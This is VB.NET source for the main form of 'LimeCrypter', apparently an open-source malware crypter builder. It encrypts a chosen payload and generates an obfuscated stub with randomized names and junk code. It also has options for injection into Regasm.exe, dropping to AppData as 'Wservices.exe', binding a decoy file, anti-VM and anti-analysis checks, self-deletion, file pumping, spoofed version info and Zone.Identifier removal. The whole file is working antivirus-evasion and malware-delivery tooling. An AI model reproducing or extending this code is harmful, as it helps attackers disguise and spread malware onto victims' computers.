Public Class Main
    'Creadit : https://github.com/NYAN-x-CAT

#Region "F i l e "



    Private Sub btnPayload_Click(sender As Object, e As EventArgs) Handles btnPayload.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Executable |*.exe"
            If o.ShowDialog = DialogResult.OK Then
                txtPayload.Text = o.FileName
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub btnBind_Click(sender As Object, e As EventArgs) Handles btnBind.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Anything |*.*"
            If o.ShowDialog = DialogResult.OK Then
                txtBind.Text = o.FileName
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub chkBind_Click(sender As Object, e As EventArgs) Handles chkBind.Click
        If chkBind.Checked = True Then
            txtBind.Enabled = True
            btnBind.Enabled = True
            chkBindOnce.Enabled = True
        Else
            txtBind.Enabled = False
            btnBind.Enabled = False
            chkBindOnce.Enabled = False
        End If
    End Sub

    Private Sub chkItself_Click(sender As Object, e As EventArgs) Handles chkItself.Click
        If chkItself.Checked = True Then
            chkRegasm.Checked = False
        End If
    End Sub

    Private Sub chkRegasm_Click(sender As Object, e As EventArgs) Handles chkRegasm.Click
        If chkRegasm.Checked = True Then
            chkItself.Checked = False
        End If
    End Sub

#End Region

#Region "S e t t i n g s"

    Private Sub chkDrop_Click(sender As Object, e As EventArgs) Handles chkDrop.Click
        If chkDrop.Checked = True Then
            txtDropName.Enabled = True
            txtDropPath.Enabled = True
            txtDropPath.SelectedIndex = 0
        Else
            txtDropName.Enabled = False
            txtDropPath.Enabled = False
        End If
    End Sub

    Private Sub chkPump_Click(sender As Object, e As EventArgs) Handles chkPump.Click
        If chkPump.Checked = True Then
            numPump.Enabled = True
        Else
            numPump.Enabled = False
        End If
    End Sub

    Private Sub chkDelay_Click(sender As Object, e As EventArgs) Handles chkDelay.Click
        '
    End Sub





#End Region

#Region "A s s e m b l y"


    Private Sub chkAssembly_Click(sender As Object, e As EventArgs) Handles chkAssembly.Click
        If chkAssembly.Checked = True Then
            btnAssemblyClone.Enabled = True
            btnAssemblyRandom.Enabled = True
            txtAssemblyTitle.Enabled = True
            txtAssemblyDescription.Enabled = True
            txtAssemblyCompany.Enabled = True
            txtAssemblyProduct.Enabled = True
            txtAssemblyCopyright.Enabled = True
            txtAssemblyTrademark.Enabled = True
            numAssembly1.Enabled = True
            numAssembly2.Enabled = True
            numAssembly3.Enabled = True
            numAssembly4.Enabled = True
        Else
            btnAssemblyClone.Enabled = False
            btnAssemblyRandom.Enabled = False
            txtAssemblyTitle.Enabled = False
            txtAssemblyDescription.Enabled = False
            txtAssemblyCompany.Enabled = False
            txtAssemblyProduct.Enabled = False
            txtAssemblyCopyright.Enabled = False
            txtAssemblyTrademark.Enabled = False
            numAssembly1.Enabled = False
            numAssembly2.Enabled = False
            numAssembly3.Enabled = False
            numAssembly4.Enabled = False

        End If
    End Sub

    Private Sub btnAssemblyClone_Click(sender As Object, e As EventArgs) Handles btnAssemblyClone.Click

        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtAssemblyTitle.Text = info.InternalName
                txtAssemblyDescription.Text = info.FileDescription
                txtAssemblyCompany.Text = info.CompanyName
                txtAssemblyProduct.Text = info.ProductName
                txtAssemblyCopyright.Text = info.LegalCopyright
                txtAssemblyTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
                ' MsgBox(ex.Message, MsgBoxStyle.Critical)
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If
            Try
                numAssembly1.Value = version(0)
                numAssembly2.Value = version(1)
                numAssembly3.Value = version(2)
                numAssembly4.Value = version(3)
            Catch ex2 As Exception
                'MsgBox(ex2.Message, MsgBoxStyle.Critical)
            End Try
        End If

    End Sub

    Private Sub btnAssemblyRandom_Click(sender As Object, e As EventArgs) Handles btnAssemblyRandom.Click

        txtAssemblyTitle.Text = Helper.Randomi(Helper.rand.Next(4, 10)) + " " + Helper.Randomi(Helper.rand.Next(4, 10))
        txtAssemblyDescription.Text = Helper.Randomi(Helper.rand.Next(4, 10)) + " " + Helper.Randomi(Helper.rand.Next(4, 10))
        txtAssemblyCompany.Text = Helper.Randomi(Helper.rand.Next(4, 10)) + " " + Helper.Randomi(Helper.rand.Next(4, 10))
        txtAssemblyProduct.Text = Helper.Randomi(Helper.rand.Next(4, 10)) + " " + Helper.Randomi(Helper.rand.Next(4, 10))
        txtAssemblyCopyright.Text = Helper.Randomi(Helper.rand.Next(4, 10)) + " " + Helper.Randomi(Helper.rand.Next(4, 10))
        txtAssemblyTrademark.Text = Helper.Randomi(Helper.rand.Next(4, 10)) + " " + Helper.Randomi(Helper.rand.Next(4, 10))
        numAssembly1.Value = Helper.rand.Next(0, 9)
        numAssembly2.Value = Helper.rand.Next(0, 9)
        numAssembly3.Value = Helper.rand.Next(0, 9)
        numAssembly4.Value = Helper.rand.Next(0, 9)

    End Sub

    Private Sub chkIcon_Click(sender As Object, e As EventArgs) Handles chkIcon.Click
        Try
            If chkIcon.Checked = True Then
                Dim o As New OpenFileDialog
                o.Filter = "Icon |*.ico"
                If o.ShowDialog = DialogResult.OK Then
                    picIcon.ImageLocation = o.FileName
                Else
                    picIcon.ImageLocation = ""
                    chkIcon.Checked = False
                End If
            Else
                picIcon.ImageLocation = ""
                chkIcon.Checked = False
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub





#End Region

#Region "B u i l d"
    Public Shared OutputPayload As String = String.Empty
    Public Shared Key As String = String.Empty

    Public Shared ResName As String = Helper.Randomi(Helper.rand.Next(6, 12))
    Public Shared ResPayload = Helper.Randomi(Helper.rand.Next(5, 10))
    Public Shared ResDLL = Helper.Randomi(Helper.rand.Next(5, 10))
    Public Shared ResBind = Helper.Randomi(Helper.rand.Next(5, 10))

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Dim s As New SaveFileDialog
        s.Filter = "Executable |*.exe"
        If s.ShowDialog = DialogResult.OK Then
            OutputPayload = s.FileName
            BackgroundWorker1.RunWorkerAsync()
            btnBuild.Enabled = False
            btnBuild.Text = "Please wait"
        End If

    End Sub

    Private Sub PvButton1_Click(sender As Object, e As EventArgs) Handles PvButton1.Click
        On Error Resume Next
        Application.Exit()
        End
    End Sub

    Private Sub PvEmbeddedButton1_Click(sender As Object, e As EventArgs) Handles PvEmbeddedButton1.Click

        Try
            MsgBox("Select Payload")
            btnPayload_Click(btnPayload, e)

            chkDrop.Checked = True
            txtDropName.Text = "Wservices.exe"
            txtDropPath.Text = "Appdata"

            Dim result As DialogResult
            result = MessageBox.Show("Do you want to bind a file?", "LimeCrypter", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then
                chkBind.Checked = True
                chkBindOnce.Checked = True
                btnBind_Click(btnBind, e)
            End If

            chkAntiTask.Checked = False
            chkAntiVM.Checked = False
            chkAntiWireshark.Checked = False

            chkZoneIden.Checked = True
            chkPump.Checked = True : numPump.Value = 200
            chkDelay.Checked = True

            chkAssembly.Checked = True
            btnAssemblyRandom_Click(btnAssemblyRandom, e)

            chkIcon.Checked = True
            MsgBox("Select Icon")
            chkIcon_Click(chkIcon, e)

            PvTabControl_Side1.SelectTab(3)
            MsgBox("Save Output")
            btnBuild_Click(btnBuild, e)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles Me.Load
        CheckForIllegalCrossThreadCalls = False
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.Clear()) : Else : txtLog.Clear() : End If

            Dim Source As String = My.Resources.Source

            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.Text = "Generating encryption key..." + Environment.NewLine) : Else : txtLog.Text = "Generating encryption key..." + Environment.NewLine : End If
            Key = Helper.Randomi(12)
            Source = Replace(Source, "%KEY%", Key)

            If chkRegasm.Checked = True Then
                txtLog.AppendText("Injection Regasm" + Environment.NewLine)
                Source = Replace(Source, "%Inject%", Chr(34) + "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe" + Chr(34))
            Else
                txtLog.AppendText("Injection. Itself" + Environment.NewLine)
                txtLog.AppendText("Injection..." + Environment.NewLine)
                Source = Replace(Source, "%Inject%", "Application.ExecutablePath")
            End If

            'rename
            txtLog.AppendText("Applying USG..." + Environment.NewLine)
            Source = Replace(Source, "%Class1%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Run%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Asm%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Res%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%ResName%", ResName)
            Source = Replace(Source, "%EncyptedPayload%", ResPayload)
            Source = Replace(Source, "%EncryptedDLL%", ResDLL)
            Source = Replace(Source, "%DecAdd%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%DecDLL%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%DLL%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%PYLD%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%ZIP%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%J%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%N%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%V%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%AES%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Hash_AES%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%temp%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%DESDecrypter%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Buffer%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%hash%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%AES_Decrypt%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%AESinput%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%AESpass%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%iProcess%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Wireshark%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Task%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%pr%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%VM%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Mutex%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%createdNew%", Helper.Randomi(Helper.rand.Next(6, 12)))
            Source = Replace(Source, "%Info%", Helper.Randomi(Helper.rand.Next(6, 12)))

            'junk  methods
            Source = Replace(Source, "%JUNK1%", GenerateJunk(RandomNumber(1, 2)))
            Source = Replace(Source, "%JUNK2%", GenerateJunk(RandomNumber(1, 2)))
            Source = Replace(Source, "%JUNK3%", GenerateJunk(RandomNumber(1, 2)))
            Source = Replace(Source, "%JUNK4%", GenerateJunk(RandomNumber(1, 2)))
            Source = Replace(Source, "%JUNK5%", GenerateJunk(RandomNumber(1, 2)))
            Source = Replace(Source, "%JUNK6%", GenerateJunk(RandomNumber(1, 2)))

            'junk classes
            Source = Replace(Source, "%JUNK7%", GenerateJunkClass(RandomNumber(1, 2)))
            Source = Replace(Source, "%JUNK8%", GenerateJunkClass(RandomNumber(1, 2)))


            If chkDrop.Checked = True Then
                txtLog.AppendText("Enabling Installation..." + Environment.NewLine)
                Source = Replace(Source, "'%Drop%", Nothing)
                Source = Replace(Source, "%DropSub%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "%STUP%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "%EXE%", txtDropName.Text)
                Source = Replace(Source, "%PATH%", txtDropPath.Text)
            End If

            If chkAntiWireshark.Checked = True Then
                txtLog.AppendText("Enabling Anti Wireshark..." + Environment.NewLine)
                Source = Replace(Source, "'%ANTIWIRE%", Nothing)
                Source = Replace(Source, "%T2%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "WiresharkString%", Algorithm.AES_Encrypt("wireshark", Key))
            End If

            If chkAntiTask.Checked = True Then
                txtLog.AppendText("Enabling Anti Task Manager..." + Environment.NewLine)
                Source = Replace(Source, "'%ANTITASK%", Nothing)
                Source = Replace(Source, "%T3%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "%TaskString%", Algorithm.AES_Encrypt("taskmgr", Key))
            End If

            If chkAntiVM.Checked = True Then
                txtLog.AppendText("Enabling Anti Virtual Machines..." + Environment.NewLine)
                Source = Replace(Source, "'%ANTIVM%", Nothing)
                Source = Replace(Source, "%DEL%", Algorithm.AES_Encrypt("/C ping 1.1.1.1 -n 2 & Del ", Key))
            End If

            If chkAssembly.Checked = True Then
                txtLog.AppendText("Writing Assembly Information..." + Environment.NewLine)
                Source = Replace(Source, "'%ASSEMBLY%", Nothing)
                Source = Replace(Source, "%Title%", txtAssemblyTitle.Text)
                Source = Replace(Source, "%Description%", txtAssemblyDescription.Text)
                Source = Replace(Source, "%Company%", txtAssemblyCompany.Text)
                Source = Replace(Source, "%Product%", txtAssemblyProduct.Text)
                Source = Replace(Source, "%Copyright%", txtAssemblyCopyright.Text)
                Source = Replace(Source, "%Trademark%", txtAssemblyTrademark.Text)
                Source = Replace(Source, "%v1%", numAssembly1.Value)
                Source = Replace(Source, "%v2%", numAssembly2.Value)
                Source = Replace(Source, "%v3%", numAssembly3.Value)
                Source = Replace(Source, "%v4%", numAssembly4.Value)
            End If

            If chkBind.Checked = True AndAlso IO.File.Exists(txtBind.Text) = True Then
                txtLog.AppendText("Bind File..." + Environment.NewLine)
                Source = Replace(Source, "%BindName%", IO.Path.GetFileName(txtBind.Text))
                Source = Replace(Source, "%EncryptedBind%", ResBind)
                Source = Replace(Source, "%DecBind%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "%Binder%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "%BindSub%", Helper.Randomi(Helper.rand.Next(6, 12)))
                Source = Replace(Source, "'%Bind%", Nothing)
                If chkBindOnce.Checked = True Then
                    Source = Replace(Source, "'%BindOnce%", Nothing)
                    Source = Replace(Source, "%LimeOnce%", Helper.Randomi(Helper.rand.Next(6, 12)))

                Else
                    Source = Replace(Source, "'%BindDaily%", Nothing)
                End If
            End If

            If chkDelay.Checked = True Then
                txtLog.AppendText("Addign Delay..." + Environment.NewLine)
                Source = Replace(Source, "'$Delay%", Nothing)
            End If

            'Adding res
            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources") 'main res or parent
                R.AddResource(ResPayload, Algorithm.AES_Encrypt(Convert.ToBase64String(IO.File.ReadAllBytes(txtPayload.Text)), Main.Key))
                R.AddResource(ResDLL, Algorithm.AES_Encrypt(Convert.ToBase64String(My.Resources.PE), Main.Key))
                If chkBind.Checked = True AndAlso IO.File.Exists(txtBind.Text) = True Then
                    R.AddResource(ResBind, Algorithm.AES_Encrypt(Convert.ToBase64String(IO.File.ReadAllBytes(txtBind.Text)), Main.Key))
                End If
                R.Generate()
            End Using

            If chkIcon.Checked Then
                Codedom.Compiler(OutputPayload, Source, picIcon.ImageLocation)
            Else
                Codedom.Compiler(OutputPayload, Source, Nothing)
            End If

            If Codedom.OK = True Then 'Codedom finished, file is already compiled but we need to add icon...etc

                'Using .NET reactor for more obfuscation, you can remove the whole process if you want
                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor1)
                Dim process As New Process()
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                process.StartInfo.FileName = "cmd.exe"
                process.StartInfo.UseShellExecute = True
                process.StartInfo.CreateNoWindow = True
                process.StartInfo.WorkingDirectory = IO.Path.GetTempPath
                process.StartInfo.Arguments = "/C dotNET_Reactor.exe -file """ & OutputPayload & """ -antitamp 1  -obfuscation 1 -antitamp  1 -targetfile """ & OutputPayload & """"
                process.Start()
                process.WaitForExit()

                'pump file
                If chkPump.Checked = True Then
                    If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.AppendText("Pumping..." + Environment.NewLine)) : Else : txtLog.AppendText("Pumping..." + Environment.NewLine) : End If
                    Helper.Pumper(OutputPayload)
                End If

                'remove zone
                If chkZoneIden.Checked = True Then
                    If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine)) : Else : txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine) : End If
                    Helper.DeleteZoneIdentifier(OutputPayload)
                End If

                'finish
                Dim PayloadSize As New IO.FileInfo(OutputPayload)
                Dim sizeInBytes As Long = PayloadSize.Length / 1024
                If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.AppendText("Done! Crypted file final size is " + sizeInBytes.ToString + " KB" + Environment.NewLine)) : Else : txtLog.AppendText("Done! Crypted file final size is " + sizeInBytes.ToString + " KB" + Environment.NewLine) : End If
            End If

            btnBuild.Enabled = True
            btnBuild.Text = "Build"

            Try
                IO.File.Delete(IO.Path.GetTempPath + "\" + ResName + ".Resources")
                IO.File.Delete(OutputPayload + ".hash")
            Catch ex As Exception
            End Try

        Catch ex As Exception
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.AppendText(ex.Message)) : Else : txtLog.AppendText(ex.Message) : End If
            btnBuild.Enabled = True
            btnBuild.Text = "Build"
            Return
        End Try
    End Sub




#End Region


End Class
